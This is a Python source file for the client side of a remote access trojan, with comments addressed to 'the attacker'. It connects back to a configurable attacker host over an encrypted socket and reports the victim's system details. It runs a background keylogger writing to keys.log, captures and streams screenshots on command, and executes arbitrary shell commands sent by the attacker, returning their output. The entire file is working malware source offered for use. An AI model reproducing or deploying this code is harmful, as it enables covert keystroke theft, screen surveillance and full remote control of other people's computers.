#!/usr/bin/python3.7
# -*- coding: utf-8 -*
import socket, subprocess, os, platform, logging, threading,time, encrypted_connection
import pyscreenshot as ImageGrab
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
class KeyLoggerThread(threading.Thread):
    global Quit
    def __init__(self):
        super().__init__()

    def run(self):
        logging.basicConfig(filename="keys.log",level=logging.DEBUG, format='%(asctime)s %(message)s')
        def on_press(key):
            logging.debug(str(key))
            if key == Key.esc:
                return False
        with Listener(on_press = on_press) as listener:
            listener.join()

HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 6969 # attacker's port on which server is listening
 
# same syntax here as for the server
encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
encrypter.initialize_tcp_connexion_client(HOST,PORT)
KeyLoggerThread = KeyLoggerThread()
KeyLoggerThread.start()
encrypter.send_message_client("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release())
 
while True:
    command = ""
    command = encrypter.receive_message_client()
    split_command = command.split()
    print("Received command : " +command)

    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                encrypter.send_message_client((os.getcwd()))
            elif len(command.split()) == 2:
                try:
                    os.chdir(command.split()[1])
                    encrypter.send_message_client(("Changed directory to " + os.getcwd()))
                except OSError as winerror:
                    encrypter.send_message_client(("No such directory : " +os.getcwd()))
    elif command == "stb" :
        im = ImageGrab.grab()
        try :
            im.save('pic.png')
            encrypter.send_message_client(("capturing"))
            pic = open("pic.png", "rb")
            picRead = pic.read(2048)
            while picRead != b'':
                encrypter.send_picture_client(picRead)
                picRead = pic.read(2048)
            pic.close()
            os.remove("pic.png")
            encrypter.send_message_client(("complete"))
        except:
            encrypter.send_message_client(("permissionsfailed"))

    elif command == "keylogger.status" :
        if KeyLoggerThread.isAlive() :
            encrypter.send_message_client(("ACTIVATED"))
        else :
            encrypter.send_message_client(("DISACTIVATED"))
    elif command == "keylogger.activate" :
        if KeyLoggerThread.isAlive() :
            encrypter.send_message_client(("ALREADY ACTIVATED"))
        else :
            KeyLoggerThread.start()
            encrypter.send_message_client(("THE KEYLOGGER HAS BEEN ACTIVATED"))
    elif command == "keylogger.deactivate" :
        if KeyLoggerThread.isAlive() :
            Listener.stop()
            encrypter.send_message_client(("KEYLOGGER DEACTIVATED"))

        else :
            encrypter.send_message_client(("ALREADY DEACTIVATED"))

 
    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(str(stdout_value))
        stdout_value = stdout_value.decode("utf-8")
        # send output to attacker
        print(stdout_value)
        if(stdout_value != ""):
            encrypter.send_message_client(stdout_value)  # renvoit l'output  à l'attaquant
        else:
            encrypter.send_message_client((command+ " does not return anything"))
Quit = False
encrypter.close_tcp_connexion_client()